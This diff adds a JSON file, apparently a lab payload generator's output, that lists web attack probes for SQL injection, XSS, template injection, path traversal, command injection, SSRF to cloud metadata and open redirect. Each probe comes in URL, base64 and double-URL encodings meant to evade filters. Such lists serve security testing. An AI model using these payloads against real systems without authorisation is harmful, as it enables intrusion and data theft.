@@ -1,0 +1,298 @@
+{
+  "ok": true,
+  "seed": "lab-1",
+  "classes": {
+    "sqli": [
+      {
+        "raw": "' OR '1'='1",
+        "id": "232b7659de38ce04",
+        "url": "%27%20OR%20%271%27%3D%271",
+        "base64": "JyBPUiAnMSc9JzE=",
+        "double-url": "%2527%2520OR%2520%25271%2527%253D%25271",
+        "base64+url": "JyBPUiAnMSc9JzE%3D"
+      },
+      {
+        "raw": "' OR '1'='1' --",
+        "id": "d0913cfa09f65a8e",
+        "url": "%27%20OR%20%271%27%3D%271%27%20--",
+        "base64": "JyBPUiAnMSc9JzEnIC0t",
+        "double-url": "%2527%2520OR%2520%25271%2527%253D%25271%2527%2520--",
+        "base64+url": "JyBPUiAnMSc9JzEnIC0t"
+      },
+      {
+        "raw": "1' ORDER BY 1--",
+        "id": "174f6ab021ecfde7",
+        "url": "1%27%20ORDER%20BY%201--",
+        "base64": "MScgT1JERVIgQlkgMS0t",
+        "double-url": "1%2527%2520ORDER%2520BY%25201--",
+        "base64+url": "MScgT1JERVIgQlkgMS0t"
+      },
+      {
+        "raw": "1 UNION SELECT NULL,version()--",
+        "id": "26cdbeba317a06bc",
+        "url": "1%20UNION%20SELECT%20NULL%2Cversion%28%29--",
+        "base64": "MSBVTklPTiBTRUxFQ1QgTlVMTCx2ZXJzaW9uKCktLQ==",
+        "double-url": "1%2520UNION%2520SELECT%2520NULL%252Cversion%2528%2529--",
+        "base64+url": "MSBVTklPTiBTRUxFQ1QgTlVMTCx2ZXJzaW9uKCktLQ%3D%3D"
+      },
+      {
+        "raw": "1'; WAITFOR DELAY '0:0:5'--",
+        "id": "a9740ba136c6f84a",
+        "url": "1%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
+        "base64": "MSc7IFdBSVRGT1IgREVMQVkgJzA6MDo1Jy0t",
+        "double-url": "1%2527%253B%2520WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527--",
+        "base64+url": "MSc7IFdBSVRGT1IgREVMQVkgJzA6MDo1Jy0t"
+      },
+      {
+        "raw": "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
+        "id": "bff895792a82b824",
+        "url": "1%20AND%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29--",
+        "base64": "MSBBTkQgKFNFTEVDVCAxIEZST00gKFNFTEVDVCBTTEVFUCg1KSlhKS0t",
+        "double-url": "1%2520AND%2520%2528SELECT%25201%2520FROM%2520%2528SELECT%2520SLEEP%25285%2529%2529a%2529--",
+        "base64+url": "MSBBTkQgKFNFTEVDVCAxIEZST00gKFNFTEVDVCBTTEVFUCg1KSlhKS0t"
+      }
+    ],
+    "xss": [
+      {
+        "raw": "<script>alert(1)</script>",
+        "id": "1f30d30286f885b4",
+        "url": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "base64": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "double-url": "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+        "base64+url": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D"
+      },
+      {
+        "raw": "<img src=x onerror=alert(1)>",
+        "id": "3258b393012f6a67",
+        "url": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "base64": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==",
+        "double-url": "%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
+        "base64+url": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D"
+      },
+      {
+        "raw": "\"><svg onload=alert(1)>",
+        "id": "3df09f1a8216e169",
+        "url": "%22%3E%3Csvg%20onload%3Dalert%281%29%3E",
+        "base64": "Ij48c3ZnIG9ubG9hZD1hbGVydCgxKT4=",
+        "double-url": "%2522%253E%253Csvg%2520onload%253Dalert%25281%2529%253E",
+        "base64+url": "Ij48c3ZnIG9ubG9hZD1hbGVydCgxKT4%3D"
+      },
+      {
+        "raw": "javascript:alert(1)",
+        "id": "b0af076a86dce280",
+        "url": "javascript%3Aalert%281%29",
+        "base64": "amF2YXNjcmlwdDphbGVydCgxKQ==",
+        "double-url": "javascript%253Aalert%25281%2529",
+        "base64+url": "amF2YXNjcmlwdDphbGVydCgxKQ%3D%3D"
+      },
+      {
+        "raw": "'-alert(1)-'",
+        "id": "87cbbd0e2dd5cbcd",
+        "url": "%27-alert%281%29-%27",
+        "base64": "Jy1hbGVydCgxKS0n",
+        "double-url": "%2527-alert%25281%2529-%2527",
+        "base64+url": "Jy1hbGVydCgxKS0n"
+      },
+      {
+        "raw": "</textarea><script>alert(1)</script>",
+        "id": "3525a5a1295edd50",
+        "url": "%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "base64": "PC90ZXh0YXJlYT48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+",
+        "double-url": "%253C%252Ftextarea%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+        "base64+url": "PC90ZXh0YXJlYT48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ%2B"
+      }
+    ],
+    "ssti": [
+      {
+        "raw": "${7*7}",
+        "id": "072f473dd6feec2a",
+        "url": "%24%7B7%2A7%7D",
+        "base64": "JHs3Kjd9",
+        "double-url": "%2524%257B7%252A7%257D",
+        "base64+url": "JHs3Kjd9"
+      },
+      {
+        "raw": "{{7*7}}",
+        "id": "f7d6271d19e4524b",
+        "url": "%7B%7B7%2A7%7D%7D",
+        "base64": "e3s3Kjd9fQ==",
+        "double-url": "%257B%257B7%252A7%257D%257D",
+        "base64+url": "e3s3Kjd9fQ%3D%3D"
+      },
+      {
+        "raw": "<%= 7*7 %>",
+        "id": "7ee017c68d100ba1",
+        "url": "%3C%25%3D%207%2A7%20%25%3E",
+        "base64": "PCU9IDcqNyAlPg==",
+        "double-url": "%253C%2525%253D%25207%252A7%2520%2525%253E",
+        "base64+url": "PCU9IDcqNyAlPg%3D%3D"
+      },
+      {
+        "raw": "#{7*7}",
+        "id": "62d63854a669bb87",
+        "url": "%23%7B7%2A7%7D",
+        "base64": "I3s3Kjd9",
+        "double-url": "%2523%257B7%252A7%257D",
+        "base64+url": "I3s3Kjd9"
+      },
+      {
+        "raw": "${{7*'7'}}",
+        "id": "31d5e05ec7226d60",
+        "url": "%24%7B%7B7%2A%277%27%7D%7D",
+        "base64": "JHt7NyonNyd9fQ==",
+        "double-url": "%2524%257B%257B7%252A%25277%2527%257D%257D",
+        "base64+url": "JHt7NyonNyd9fQ%3D%3D"
+      }
+    ],
+    "traversal": [
+      {
+        "raw": "../../etc/passwd",
+        "id": "a794fcba1e2bdd31",
+        "url": "..%2F..%2Fetc%2Fpasswd",
+        "base64": "Li4vLi4vZXRjL3Bhc3N3ZA==",
+        "double-url": "..%252F..%252Fetc%252Fpasswd",
+        "base64+url": "Li4vLi4vZXRjL3Bhc3N3ZA%3D%3D"
+      },
+      {
+        "raw": "..\\..\\..\\windows\\win.ini",
+        "id": "20a5fe6b07cee83d",
+        "url": "..%5C..%5C..%5Cwindows%5Cwin.ini",
+        "base64": "Li5cLi5cLi5cd2luZG93c1x3aW4uaW5p",
+        "double-url": "..%255C..%255C..%255Cwindows%255Cwin.ini",
+        "base64+url": "Li5cLi5cLi5cd2luZG93c1x3aW4uaW5p"
+      },
+      {
+        "raw": "....//....//etc/passwd",
+        "id": "5a86f7c2e83ab281",
+        "url": "....%2F%2F....%2F%2Fetc%2Fpasswd",
+        "base64": "Li4uLi8vLi4uLi8vZXRjL3Bhc3N3ZA==",
+        "double-url": "....%252F%252F....%252F%252Fetc%252Fpasswd",
+        "base64+url": "Li4uLi8vLi4uLi8vZXRjL3Bhc3N3ZA%3D%3D"
+      },
+      {
+        "raw": "%2e%2e%2f%2e%2e%2fetc/passwd",
+        "id": "cbe43a91853c2a91",
+        "url": "%252e%252e%252f%252e%252e%252fetc%2Fpasswd",
+        "base64": "JTJlJTJlJTJmJTJlJTJlJTJmZXRjL3Bhc3N3ZA==",
+        "double-url": "%25252e%25252e%25252f%25252e%25252e%25252fetc%252Fpasswd",
+        "base64+url": "JTJlJTJlJTJmJTJlJTJlJTJmZXRjL3Bhc3N3ZA%3D%3D"
+      }
+    ],
+    "cmd": [
+      {
+        "raw": "; id",
+        "id": "60bee76f3f1533f2",
+        "url": "%3B%20id",
+        "base64": "OyBpZA==",
+        "double-url": "%253B%2520id",
+        "base64+url": "OyBpZA%3D%3D"
+      },
+      {
+        "raw": "| id",
+        "id": "1b5d01f5e6664bd0",
+        "url": "%7C%20id",
+        "base64": "fCBpZA==",
+        "double-url": "%257C%2520id",
+        "base64+url": "fCBpZA%3D%3D"
+      },
+      {
+        "raw": "`id`",
+        "id": "fbfcc43e4e862ed3",
+        "url": "%60id%60",
+        "base64": "YGlkYA==",
+        "double-url": "%2560id%2560",
+        "base64+url": "YGlkYA%3D%3D"
+      },
+      {
+        "raw": "$(id)",
+        "id": "e40c88d906be57ff",
+        "url": "%24%28id%29",
+        "base64": "JChpZCk=",
+        "double-url": "%2524%2528id%2529",
+        "base64+url": "JChpZCk%3D"
+      },
+      {
+        "raw": "& dir",
+        "id": "ef9a40326798b15c",
+        "url": "%26%20dir",
+        "base64": "JiBkaXI=",
+        "double-url": "%2526%2520dir",
+        "base64+url": "JiBkaXI%3D"
+      },
+      {
+        "raw": "\n/bin/id",
+        "id": "f6102611dbbde1f9",
+        "url": "%0A%2Fbin%2Fid",
+        "base64": "Ci9iaW4vaWQ=",
+        "double-url": "%250A%252Fbin%252Fid",
+        "base64+url": "Ci9iaW4vaWQ%3D"
+      }
+    ],
+    "ssrf": [
+      {
+        "raw": "http://127.0.0.1:80",
+        "id": "2c32517930bb86b2",
+        "url": "http%3A%2F%2F127.0.0.1%3A80",
+        "base64": "aHR0cDovLzEyNy4wLjAuMTo4MA==",
+        "double-url": "http%253A%252F%252F127.0.0.1%253A80",
+        "base64+url": "aHR0cDovLzEyNy4wLjAuMTo4MA%3D%3D"
+      },
+      {
+        "raw": "http://169.254.169.254/latest/meta-data/",
+        "id": "df81c891c7ca892a",
+        "url": "http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
+        "base64": "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==",
+        "double-url": "http%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252F",
+        "base64+url": "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw%3D%3D"
+      },
+      {
+        "raw": "http://[::1]/",
+        "id": "34c06c69b1019e92",
+        "url": "http%3A%2F%2F%5B%3A%3A1%5D%2F",
+        "base64": "aHR0cDovL1s6OjFdLw==",
+        "double-url": "http%253A%252F%252F%255B%253A%253A1%255D%252F",
+        "base64+url": "aHR0cDovL1s6OjFdLw%3D%3D"
+      },
+      {
+        "raw": "gopher://127.0.0.1:6379/_INFO",
+        "id": "b7f022939e8f4d54",
+        "url": "gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFO",
+        "base64": "Z29waGVyOi8vMTI3LjAuMC4xOjYzNzkvX0lORk8=",
+        "double-url": "gopher%253A%252F%252F127.0.0.1%253A6379%252F_INFO",
+        "base64+url": "Z29waGVyOi8vMTI3LjAuMC4xOjYzNzkvX0lORk8%3D"
+      }
+    ],
+    "openredirect": [
+      {
+        "raw": "//evil.example",
+        "id": "0b7ea8a1e7f0e083",
+        "url": "%2F%2Fevil.example",
+        "base64": "Ly9ldmlsLmV4YW1wbGU=",
+        "double-url": "%252F%252Fevil.example",
+        "base64+url": "Ly9ldmlsLmV4YW1wbGU%3D"
+      },
+      {
+        "raw": "https://evil.example",
+        "id": "6d75949ae091f812",
+        "url": "https%3A%2F%2Fevil.example",
+        "base64": "aHR0cHM6Ly9ldmlsLmV4YW1wbGU=",
+        "double-url": "https%253A%252F%252Fevil.example",
+        "base64+url": "aHR0cHM6Ly9ldmlsLmV4YW1wbGU%3D"
+      },
+      {
+        "raw": "//evil.example@trusted.example",
+        "id": "dc419835907f7750",
+        "url": "%2F%2Fevil.example%40trusted.example",
+        "base64": "Ly9ldmlsLmV4YW1wbGVAdHJ1c3RlZC5leGFtcGxl",
+        "double-url": "%252F%252Fevil.example%2540trusted.example",
+        "base64+url": "Ly9ldmlsLmV4YW1wbGVAdHJ1c3RlZC5leGFtcGxl"
+      }
+    ]
+  },
+  "chains": [
+    "url",
+    "base64",
+    "double-url",
+    "base64+url"
+  ]
+}
